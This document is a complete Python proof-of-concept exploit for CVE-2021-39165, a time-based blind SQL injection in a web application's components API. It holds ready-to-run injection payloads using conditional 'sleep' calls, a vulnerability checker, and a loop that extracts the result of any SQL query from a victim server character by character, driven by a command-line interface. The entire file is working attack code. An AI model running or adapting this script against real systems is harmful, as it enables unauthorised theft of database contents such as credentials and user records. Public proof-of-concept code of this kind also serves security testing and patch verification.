#!/usr/bin/python3

################################################################
# Author: @manbolq (Manuel Bolaños)                            #
# POC for CVE-2021-39165                                       #
# Time-based SQL Injection                                     #
#                                                              #
# https://github.com/manbolq/CVE-2021-39165                    #
################################################################

import requests, string, time, sys, signal, argparse
from pwn import *


def ctrl_c(sig, frame):
    """Defines what the program will do when the user presses Ctrl+C"""
    print("\n\n[!] Exiting...\n")
    sys.exit(1)


# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Global variables
characters = string.ascii_lowercase + string.digits + string.ascii_uppercase + string.punctuation  # modify the set of characters as you want
characters = characters.replace('+', '')  # Gets rid of the '+' char
lapse = 1.5
endpoint = '/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]='
max_length = 1000  # if you have a larger database, you can change this parameter


def check_vulnerable(url):
    """Checks whether the target is vulnerable or not

    Args:
        url: Target's HTTP url """

    print('[-] Checking if the target is vulnerable...')
    start = time.time()
    requests.get(url + endpoint +
                 "or 'a'='a') and (select sleep(%f))-- -" % lapse)
    end = time.time()

    if end - start >= lapse:
        print('[+] Vulnerable!')
    else:
        print('[!] Not vulnerable :(')


def dump_query_result(url, query):
    """Shows the result of the query passed as argument

    Args:
        url: Target's HTTP url
        query: SQL query to be executed in the victim's database"""

    p1 = log.progress('Brute forcing')
    p1.status('Starting process...')

    time.sleep(2)

    p2 = log.progress('Dumped info: ')
    dumped = ''
    for position in range(1, max_length):
        for character in characters:
            p1.status('This might take a while :P')

            start = time.time()
            requests.get(
                url + endpoint +
                "or 'a'='a') and (select case when substring((%s),%d,1)='%s' then sleep(%f) else true end)-- -"
                % (query, position, character, lapse))
            end = time.time()

            if end - start >= lapse:
                dumped += character
                p2.status(dumped)
                break

            if character == characters[-1]:
                return


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='''CVE-2021-39165 exploit.
Author: @manbolq (Manuel Bolaños)
This exploits a time based SQLi in a GET parameter''',
        formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-u',
                        '--url',
                        help='Victim URL',
                        required=True)

    parser.add_argument('-c',
                        '--check',
                        action='store_true',
                        help='Check if the victim is vulnerable')

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument('-q',
                       '--query',
                       required=parser.get_default('check'),
                       help='Query to execute')

    args = parser.parse_args()
    url = args.url
    check = args.check
    query = args.query

    if check:
        check_vulnerable(url)
    else:
        dump_query_result(url, query)
